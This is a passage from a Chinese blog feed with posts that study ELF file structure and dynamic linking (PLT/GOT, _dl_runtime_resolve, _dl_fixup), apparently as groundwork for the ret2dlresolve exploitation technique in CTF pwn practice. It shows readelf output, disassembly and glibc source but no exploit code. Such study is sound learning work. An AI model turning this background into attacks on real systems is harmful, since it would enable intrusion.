<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L0ne1y@L0ne1y:~&#x2F;pwn&#x2F;ROP&#x2F;ret2libc3$ readelf -l ret2libc3</span><br><span class="line"></span><br><span class="line">Elf 文件类型为 EXEC (可执行文件)</span><br><span class="line">入口点 0x80484d0</span><br><span class="line">共有 9 个程序头，开始于偏移量 52</span><br><span class="line"></span><br><span class="line">程序头：</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4</span><br><span class="line">  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1</span><br><span class="line">      [Requesting program interpreter: &#x2F;lib&#x2F;ld-linux.so.2]</span><br><span class="line">  LOAD           0x000000 0x08048000 0x08048000 0x00884 0x00884 R E 0x1000</span><br><span class="line">  LOAD           0x000f08 0x08049f08 0x08049f08 0x00134 0x001dc RW  0x1000</span><br><span class="line">  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4</span><br><span class="line">  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4</span><br><span class="line">  GNU_EH_FRAME   0x000780 0x08048780 0x08048780 0x00034 0x00034 R   0x4</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br><span class="line">  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  段节...</span><br><span class="line">   00     </span><br><span class="line">   01     .interp </span><br><span class="line">   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version 		   .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame </span><br><span class="line">   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss </span><br><span class="line">   04     .dynamic </span><br><span class="line">   05     .note.ABI-tag .note.gnu.build-id </span><br><span class="line">   06     .eh_frame_hdr </span><br><span class="line">   07     </span><br><span class="line">   08     .init_array .fini_array .jcr .dynamic .got</span><br></pre></td></tr></table></figure>

<p>可以看到，一共有9个segment，只有类型为<code>LOAD</code>的段是运行时真正需要的。我们可以看到第一个<code>LOAD</code>的执行权限是R(可读)W(可读)的，它的编号是03，在这个segment中包含多个section，包括了<code>.init_array .fini_array .jcr .dynamic .got .got.plt .data .bss</code> 。到这里我们就可以明白了一个segment可能包含多个section，这也就是segment和section的映射关系。</p>
<h3 id="ELF-Section-Header-Table"><a href="#ELF-Section-Header-Table" class="headerlink" title="ELF Section Header Table"></a>ELF Section Header Table</h3><p><img src="https://i.loli.net/2020/11/01/v1tYzuasX5OyPfC.png" alt="image-20201029222446358.png"></p>
<p>ELF 节头表是一个节头数组。每一个节头都描述了其所对应的节的信息，如节名、节大小、在文件中的偏移、读写权限等。编译器、链接器、装载器都是通过节头表来定位和访问各个节的属性的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L0ne1y@L0ne1y:~&#x2F;pwn&#x2F;ROP&#x2F;ret2libc3$ readelf -S ret2libc3</span><br><span class="line">共有 35 个节头，从偏移量 0x1924 开始：</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000e0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          080482b8 0002b8 00008f 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048348 000348 00001c 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048364 000364 000030 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048394 000394 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             080483ac 0003ac 000050 08   A  5  12  4</span><br><span class="line">  [11] .init             PROGBITS        080483fc 0003fc 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048420 000420 0000b0 04  AX  0   0 16</span><br><span class="line">  [13] .text             PROGBITS        080484d0 0004d0 000242 00  AX  0   0 16</span><br><span class="line">  [14] .fini             PROGBITS        08048714 000714 000014 00  AX  0   0  4</span><br><span class="line">  [15] .rodata           PROGBITS        08048728 000728 000056 00   A  0   0  4</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS        08048780 000780 000034 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame         PROGBITS        080487b4 0007b4 0000d0 00   A  0   0  4</span><br><span class="line">  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        0804a000 001000 000034 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804a034 001034 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804a040 00103c 0000a4 00  WA  0   0 32</span><br><span class="line">  [26] .comment          PROGBITS        00000000 00103c 00002b 01  MS  0   0  1</span><br><span class="line">  [27] .debug_aranges    PROGBITS        00000000 001067 000020 00      0   0  1</span><br><span class="line">  [28] .debug_info       PROGBITS        00000000 001087 000329 00      0   0  1</span><br><span class="line">  [29] .debug_abbrev     PROGBITS        00000000 0013b0 0000f8 00      0   0  1</span><br><span class="line">  [30] .debug_line       PROGBITS        00000000 0014a8 0000c5 00      0   0  1</span><br><span class="line">  [31] .debug_str        PROGBITS        00000000 00156d 000270 01  MS  0   0  1</span><br><span class="line">  [32] .shstrtab         STRTAB          00000000 0017dd 000146 00      0   0  1</span><br><span class="line">  [33] .symtab           SYMTAB          00000000 001e9c 000530 10     34  50  4</span><br><span class="line">  [34] .strtab           STRTAB          00000000 0023cc 000305 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure>

<h4 id="节类型（sh-type）"><a href="#节类型（sh-type）" class="headerlink" title="节类型（sh_type）"></a>节类型（sh_type）</h4><p>节名是一个字符串，只是在链接和编译过程中有意义，但它并不能真正地表示节的类型。对于编译器和链接器来说，主要决定节的属性是节的类型（<code>sh_type</code>）和节的标志位（<code>sh_flags</code>）。</p>
<p>节的类型相关常量以<code>SHT_</code>开头，上述<code>readelf -S</code>命令执行的结果省略了该前缀。常见的节类型如下表所示：</p>
<table>
<thead>
<tr>
<th align="center">常量</th>
<th align="center">值</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">SHT_NULL</td>
<td align="center">0</td>
<td align="center">无效节</td>
</tr>
<tr>
<td align="center">SHT_PROGBITS</td>
<td align="center">1</td>
<td align="center"><strong>程序节</strong>。代码节、数据节都是这种类型。</td>
</tr>
<tr>
<td align="center">SHT_SYMTAB</td>
<td align="center">2</td>
<td align="center"><strong>符号表</strong></td>
</tr>
<tr>
<td align="center">SHT_STRTAB</td>
<td align="center">3</td>
<td align="center"><strong>字符串表</strong></td>
</tr>
<tr>
<td align="center">SHT_RELA</td>
<td align="center">4</td>
<td align="center"><strong>重定位表</strong>。该节包含了重定位信息。</td>
</tr>
<tr>
<td align="center">SHT_HASH</td>
<td align="center">5</td>
<td align="center"><strong>符号表的哈希表</strong></td>
</tr>
<tr>
<td align="center">SHT_DYNAMIC</td>
<td align="center">6</td>
<td align="center">动态链接信息</td>
</tr>
<tr>
<td align="center">SHT_NOTE</td>
<td align="center">7</td>
<td align="center">提示性信息</td>
</tr>
<tr>
<td align="center">SHT_NOBITS</td>
<td align="center">8</td>
<td align="center">表示该节在文件中没有内容。如<code>.bss</code>节</td>
</tr>
<tr>
<td align="center">SHT_REL</td>
<td align="center">9</td>
<td align="center">该节包含了重定位信息</td>
</tr>
<tr>
<td align="center">SHT_SHLIB</td>
<td align="center">10</td>
<td align="center">保留</td>
</tr>
<tr>
<td align="center">SHT_DNYSYM</td>
<td align="center">11</td>
<td align="center"><strong>动态链接的符号表</strong></td>
</tr>
</tbody></table>
<h4 id="节标志位（sh-flag）"><a href="#节标志位（sh-flag）" class="headerlink" title="节标志位（sh_flag）"></a>节标志位（sh_flag）</h4><p>节标志位表示该节在进程虚拟地址空间中的属性。如是否可写、是否可执行等。相关常量以<code>SHF_</code>开头。常见的节标志位如下表所示：</p>
<table>
<thead>
<tr>
<th align="center">常量</th>
<th align="center">值</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">SHF_WRITE</td>
<td align="center">1(W)</td>
<td align="center">表示该节在进程空间中可写</td>
</tr>
<tr>
<td align="center">SHF_ALLOC</td>
<td align="center">2</td>
<td align="center">表示该节在进程空间中需要分配空间。有些包含指示或控制信息的节不需要在进程空间中分配空间，就不会有这个标志。</td>
</tr>
<tr>
<td align="center">SHF_EXECINSTR</td>
<td align="center">4(X)</td>
<td align="center">表示该节在进程空间中可以被执行</td>
</tr>
</tbody></table>
<h3 id="ELF-Sections"><a href="#ELF-Sections" class="headerlink" title="ELF Sections"></a>ELF Sections</h3><h4 id="节的分类"><a href="#节的分类" class="headerlink" title="节的分类"></a>节的分类</h4><p>上述ELF Section Header Table部分已经简单介绍了节类型。接下来我们来介绍详细一些比较重要的节。</p>
<h5 id="text节"><a href="#text节" class="headerlink" title=".text节"></a>.text节</h5><p><code>.text</code>节是保存了程序代码指令的<strong>代码节</strong>。<strong>一段可执行程序，如果存在Phdr，则<code>.text</code>节就会存在于<code>text</code>段中</strong>。由于<code>.text</code>节保存了程序代码，所以节类型为<code>SHT_PROGBITS</code>。</p>
<h5 id="rodata节"><a href="#rodata节" class="headerlink" title=".rodata节"></a>.rodata节</h5><p><code>rodata</code>节保存了只读的数据，如一行C语言代码中的字符串。由于<code>.rodata</code>节是只读的，所以只能存在于一个可执行文件的<strong>只读段</strong>中。因此，只能在<code>text</code>段（不是<code>data</code>段）中找到<code>.rodata</code>节。由于<code>.rodata</code>节是只读的，所以节类型为<code>SHT_PROGBITS</code>。</p>
<h5 id="plt节（过程链接表）"><a href="#plt节（过程链接表）" class="headerlink" title=".plt节（过程链接表）"></a>.plt节（过程链接表）</h5><p><code>.plt</code>节也称为<strong>过程链接表（Procedure Linkage Table）</strong>，<strong>其包含了动态链接器调用从共享库导入的函数所必需的相关代码</strong>。由于<code>.plt</code>节保存了代码，所以节类型为<code>SHT_PROGBITS</code>。</p>
<h5 id="data节"><a href="#data节" class="headerlink" title=".data节"></a>.data节</h5><p><code>.data</code>节存在于<code>data</code>段中，<strong>其保存了初始化的全局变量等数据</strong>。由于<code>.data</code>节保存了程序的变量数据，所以节类型为<code>SHT_PROGBITS</code>。</p>
<h5 id="bss节"><a href="#bss节" class="headerlink" title=".bss节"></a>.bss节</h5><p><code>.bss</code>节存在于<code>data</code>段中，占用空间不超过4字节，仅表示这个节本省的空间。<strong><code>.bss</code>节保存了未进行初始化的全局数据</strong>。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于<code>.bss</code>节未保存实际的数据，所以节类型为<code>SHT_NOBITS</code>。</p>
<h5 id="got-plt节（全局偏移表-过程链接表）"><a href="#got-plt节（全局偏移表-过程链接表）" class="headerlink" title=".got.plt节（全局偏移表-过程链接表）"></a>.got.plt节（全局偏移表-过程链接表）</h5><p><code>.got</code>节保存了<strong>全局偏移表</strong>。<strong><code>.got</code>节和<code>.plt</code>节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改</strong>。由于<code>.got.plt</code>节与程序执行有关，所以节类型为<code>SHT_PROGBITS</code>。</p>
<h5 id="dynsym节（动态链接符号表）"><a href="#dynsym节（动态链接符号表）" class="headerlink" title=".dynsym节（动态链接符号表）"></a>.dynsym节（动态链接符号表）</h5><p><code>.dynsym</code>节保存在<code>text</code>段中。<strong>其保存了从共享库导入的动态符号表</strong>。节类型为<code>SHT_DYNSYM</code>。</p>
<h5 id="dynstr节（动态链接字符串表）"><a href="#dynstr节（动态链接字符串表）" class="headerlink" title=".dynstr节（动态链接字符串表）"></a>.dynstr节（动态链接字符串表）</h5><p><code>.dynstr</code>保存了动态链接字符串表，表中存放了一系列字符串，这些字符串代表了符号名称，以空字符作为终止符。</p>
<h5 id="symtab节（符号表）"><a href="#symtab节（符号表）" class="headerlink" title=".symtab节（符号表）"></a>.symtab节（符号表）</h5><p><code>.symtab</code>节是一个<code>ElfN_Sym</code>的数组，保存了符号信息。节类型为<code>SHT_SYMTAB</code>。</p>
<h5 id="strtab节（字符串表）"><a href="#strtab节（字符串表）" class="headerlink" title=".strtab节（字符串表）"></a>.strtab节（字符串表）</h5><p><code>.strtab</code>节保存的是符号字符串表，表中的内容会被<code>.symtab</code>的<code>ElfN_Sym</code>结构中的<code>st_name</code>引用。节类型为<code>SHT_STRTAB</code>。</p>
<h4 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h4><p>节的分类中我们介绍了<code>.dynsym</code>节和<code>.symtab</code>节，两者都是符号表。那么它们到底有什么区别呢？存在什么关系呢？</p>
<p><strong>符号是对某些类型的数据或代码（如全局变量或函数）的符号引用，函数名或变量名就是符号名</strong>。例如，<code>printf()</code>函数会在动态链接符号表<code>.dynsym</code>中存有一个指向该函数的符号项（以<code>Elf_Sym</code>数据结构表示）。在大多数共享库和动态链接可执行文件中，存在两个符号表。即<code>.dynsym</code>和<code>.symtab</code>。</p>
<p><strong><code>.dynsym</code>保存了引用来自外部文件符号的全局符号</strong>。如<code>printf</code>库函数。<strong><code>.dynsym</code>保存的符号是<code>.symtab</code>所保存符合的子集，<code>.symtab</code>中还保存了可执行文件的本地符号</strong>。如全局变量，代码中定义的本地函数等。</p>
<p>既然<code>.dynsym</code>是<code>.symtab</code>的子集，那为何要同时存在两个符号表呢？</p>
<p>通过<code>readelf -S</code>命令可以查看可执行文件的输出，一部分节标志位（<code>sh_flags</code>）被标记为了<strong>A（ALLOC）、WA（WRITE/ALLOC）、AX（ALLOC/EXEC）</strong>。其中，<code>.dynsym</code>被标记为ALLOC，而<code>.symtab</code>则没有标记。</p>
<p>ALLOC表示有该标记的节会在运行时分配并装载进入内存，而<code>.symtab</code>不是在运行时必需的，因此不会被装载到内存中。<strong><code>.dynsym</code>保存的符号只能在运行时被解析，因此是运行时动态链接器所需的唯一符号</strong>。<code>.dynsym</code>对于动态链接可执行文件的执行是必需的，而<code>.symtab</code>只是用来进行调试和链接的。<img src="https://i.loli.net/2020/11/01/Of4HyAim1nDtsjR.png" alt="image-20201029230253710.png">上图所示为通过符号表索引字符串表的示意图。符号表中的每一项都是一个<code>Elf_Sym</code>结构，对应可以在字符串表中索引得到一个字符串。</p>
<h4 id="字符串表"><a href="#字符串表" class="headerlink" title="字符串表"></a>字符串表</h4><p>类似于符号表，在大多数共享库和动态链接可执行文件中，也存在两个字符串表。即<code>.dynstr</code>和<code>.strtab</code>，分别对应于<code>.dynsym</code>和<code>symtab</code>。此外，还有一个<code>.shstrtab</code>的节头字符串表，用于保存节头表中用到的字符串，可通过<code>sh_name</code>进行索引。</p>
<p>ELF文件中所有字符表的结构基本一致，如上图所示。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://chuquan.me/2018/05/21/elf-introduce/" target="_blank" rel="noopener external nofollow noreferrer">http://chuquan.me/2018/05/21/elf-introduce/</a></p>
<p><a href="https://www.cnblogs.com/jiqingwu/p/elf_format_research_01.html" target="_blank" rel="noopener external nofollow noreferrer">https://www.cnblogs.com/jiqingwu/p/elf_format_research_01.html</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>ret2_dl_runtime_resolve</category>
      </categories>
      <tags>
        <tag>ret2_dl_runtime_resolve</tag>
        <tag>ELF文件</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF文件动态链接过程</title>
    <url>/2020/11/01/ELF%E6%96%87%E4%BB%B6%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/11/01/ej1Lgs3SHmyCtrw.jpg" alt="5f9bb3398d07e.jpg"></p>
<a id="more"></a>

<h1 id="ret2-dl-runtime-resolve学习第二步"><a href="#ret2-dl-runtime-resolve学习第二步" class="headerlink" title="ret2_dl_runtime_resolve学习第二步"></a>ret2_dl_runtime_resolve学习第二步</h1><h2 id="ELF文件动态链接过程"><a href="#ELF文件动态链接过程" class="headerlink" title="ELF文件动态链接过程"></a>ELF文件动态链接过程</h2><p>这里我们以print函数为例，分析他的链接过程，首先在第一次调用print函数时，程序会跳到print_plt表，在plt表中我们可以看到他包含3条指令，其实每一个plt表都只有这三条指令。只有PLT[0]是不一样的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x8048430 &lt;printf@plt&gt;:	jmp    DWORD PTR ds:0x804a00c</span><br><span class="line">0x8048436 &lt;printf@plt+6&gt;:	push   0x0</span><br><span class="line">0x804843b &lt;printf@plt+11&gt;:	jmp    0x8048420</span><br></pre></td></tr></table></figure>

<p>第一次调用的时候，程序会跳到相应的got表处，got表中存放的是<code>0x8048436 &lt;printf@plt+6&gt;:    push   0x0</code>的地址。</p>
<p><img src="https://i.loli.net/2020/11/01/gkqGbhxouEfQtva.png" alt="image-20201030184302058.png"></p>
<p>这里<code>0x8048436 &lt;printf@plt+6&gt;:    push   0x0</code>这里的0x0代表的是printf在<code>.rel.plt</code>节的偏移量(reloc_arg)，类似的gets函数是0x1.而offest这个域表示的是printf函数在GOT表项中的位置，0804a00c，从printf@plt的第一条指令可以看出这一点。</p>
<p>向堆栈中压入这个偏移量的目的一是找到printf函数的符号名，二是找到printf函数地址在GOT表项中的位置，以便后面定位到printf的相对虚地址时写入到这个GOT表项。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">重定位节 &#39;.rel.plt&#39; 位于偏移量 0x3ac 含有 10 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0 </span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   gets@GLIBC_2.0</span><br><span class="line">0804a014  00000307 R_386_JUMP_SLOT   00000000   time@GLIBC_2.0</span><br><span class="line">0804a018  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0</span><br><span class="line">0804a01c  00000507 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">0804a020  00000607 R_386_JUMP_SLOT   00000000   srand@GLIBC_2.0</span><br><span class="line">0804a024  00000707 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a028  00000807 R_386_JUMP_SLOT   00000000   setvbuf@GLIBC_2.0</span><br><span class="line">0804a02c  00000907 R_386_JUMP_SLOT   00000000   rand@GLIBC_2.0</span><br><span class="line">0804a030  00000a07 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure>

<p>printf@plt的第三条指令，是跳到了PLT[0]，PLT[0]中只有俩条指令，第一条指令是将<code>0x804a004</code>压入栈里，这个地址就是GOT[1]，也就是共享库链接的地址(link_map)。然后第二条指令会跳到GOT[2]中所保存的地址，即_dl_runtime_resolve函数的入口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">► 0x8048420                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">  0x8048426                              jmp    dword ptr [0x804a008] &lt;0xf7fee000&gt;</span><br></pre></td></tr></table></figure>

<h3 id="dl-runtime-resolve的定义如下："><a href="#dl-runtime-resolve的定义如下：" class="headerlink" title="_dl_runtime_resolve的定义如下："></a>_dl_runtime_resolve的定义如下：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xf7fee000 &lt;+0&gt;:	push   eax</span><br><span class="line">0xf7fee001 &lt;+1&gt;:	push   ecx</span><br><span class="line">0xf7fee002 &lt;+2&gt;:	push   edx</span><br><span class="line">0xf7fee003 &lt;+3&gt;:	mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line">0xf7fee007 &lt;+7&gt;:	mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line">0xf7fee00b &lt;+11&gt;:	call   0xf7fe77e0 &lt;_dl_fixup&gt;</span><br><span class="line">0xf7fee010 &lt;+16&gt;:	pop    edx</span><br><span class="line">0xf7fee011 &lt;+17&gt;:	mov    ecx,DWORD PTR [esp]</span><br><span class="line">0xf7fee014 &lt;+20&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">0xf7fee017 &lt;+23&gt;:	mov    eax,DWORD PTR [esp+0x4]</span><br><span class="line">0xf7fee01b &lt;+27&gt;:	ret    0xc</span><br></pre></td></tr></table></figure>

<p>从printf函数到现在，一共有俩次压栈操作，一次是压入printf函数的重定位信息的偏移量(0x0)，一次是GOT[1],然后进入<code>_dl_runtime_resolve</code>函数后，首先是3次push操作，保存寄存器值，然后俩次mov将之前俩次压入的数放到edx，eax中，之后调用<code>_dl_fixup</code>函数找到printf函数的实际加载地址，将它写到GOT中，并把这个地址压入eax作为_dl_runtime_resolve函数的返回值，之后将之前edx和ecx的值从栈中恢复到edx，ecx里，<code>mov    DWORD PTR [esp],eax</code> eax_`将printf函数的实际加载地址写入此时esp指向的地址。之后的mov将eax的值恢复，之后跳到printf函数，并将栈平衡，使栈顶指向printf函数的返回地址（main函数中callq的下一条指令），这样当puts函数返回时程序就走到正确的位置执行。</p>
<p>当第二次调用puts函数时，由于其地址已经存在GOT对应表项中，直接根据地址跳转就可以。</p>
<h3 id="函数-dl-fixup"><a href="#函数-dl-fixup" class="headerlink" title="函数_dl_fixup"></a>函数_dl_fixup</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">	   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  &#x2F;&#x2F; 分别获取动态链接符号表和动态链接字符串表的基址</span><br><span class="line">  const ElfW(Sym) *const symtab</span><br><span class="line">    &#x3D; (const void *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  const char *strtab &#x3D; (const void *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;通过参数reloc_arg计算重定位入口，这里的DT_JMPREL即.rel.plt, reloc_offset即reloc_arg</span><br><span class="line">  const PLTREL *const reloc</span><br><span class="line">    &#x3D; (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;根据函数重定位表中的动态链接符号表索引，即r_info字段，获取函数在动态链接符号表中对应的条目。</span><br><span class="line">  const ElfW(Sym) *sym &#x3D; &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  void *const rel_addr &#x3D; (void *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  lookup_t result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Sanity check that we&#39;re really looking at a PLT relocation.  *&#x2F;</span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) &#x3D;&#x3D; ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   &#x2F;* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="line">      used don&#39;t look in the global scope.  *&#x2F;</span><br><span class="line">  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) &#x3D;&#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      const struct r_found_version *version &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] !&#x3D; NULL)</span><br><span class="line">	&#123;</span><br><span class="line">	  const ElfW(Half) *vernum &#x3D;</span><br><span class="line">	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx &#x3D; vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">	  version &#x3D; &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  if (version-&gt;hash &#x3D;&#x3D; 0)</span><br><span class="line">	    version &#x3D; NULL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      &#x2F;* We need to keep the scope around so do some locking.  This is</span><br><span class="line">	 not necessary for objects which cannot be unloaded or when</span><br><span class="line">	 we are not using any threads (yet).  *&#x2F;</span><br><span class="line">      int flags &#x3D; DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      if (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">	  flags |&#x3D; DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">#ifdef RTLD_ENABLE_FOREIGN_CALL</span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line">#endif</span><br><span class="line">      &#x2F;&#x2F;根据strtab+sym-&gt;st_name在字符串表中找到函数名，然后进行符号查找获取libc基地址result</span><br><span class="line">      result &#x3D; _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);</span><br><span class="line"></span><br><span class="line">      &#x2F;* We are done with the global scope.  *&#x2F;</span><br><span class="line">      if (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line">#ifdef RTLD_FINALIZE_FOREIGN_CALL</span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">      &#x2F;* Currently result contains the base load address (or link map)</span><br><span class="line">	 of the object that defines sym.  Now add in the symbol</span><br><span class="line">	 offset.  *&#x2F;</span><br><span class="line">	 &#x2F;&#x2F;将要解析的函数的偏移地址加上libc基址，就可以获取函数的实际地址</span><br><span class="line">      value &#x3D; DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">					  + sym-&gt;st_value) : 0);</span><br><span class="line">    &#125;</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      &#x2F;* We already found the symbol.  The module (and therefore its load</span><br><span class="line">	 address) is also known.  *&#x2F;</span><br><span class="line">      value &#x3D; DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result &#x3D; l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;* And now perhaps the relocation addend.  *&#x2F;</span><br><span class="line">  value &#x3D; elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;将已经解析完的函数地址写入相应的GOT表中</span><br><span class="line">  if (sym !&#x3D; NULL</span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) &#x3D;&#x3D; STT_GNU_IFUNC, 0))</span><br><span class="line">    value &#x3D; elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  &#x2F;* Finally, fix up the plt itself.  *&#x2F;</span><br><span class="line">  if (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    return value;</span><br><span class="line"></span><br><span class="line">  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要的操作是：通过参数reloc_arg确定重定位表中该函数的重定位表项；再通过该重定位表项的r_info字段，在动态链接符号表中确定该函数的符号表项，以及类型，并进行一些检查。再由动态链接符号表项的st_name在动态链接字符串表中确定函数名称。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/gm-201705/p/9901553.html" target="_blank" rel="noopener external nofollow noreferrer">https://www.cnblogs.com/gm-201705/p/9901553.html</a></p>
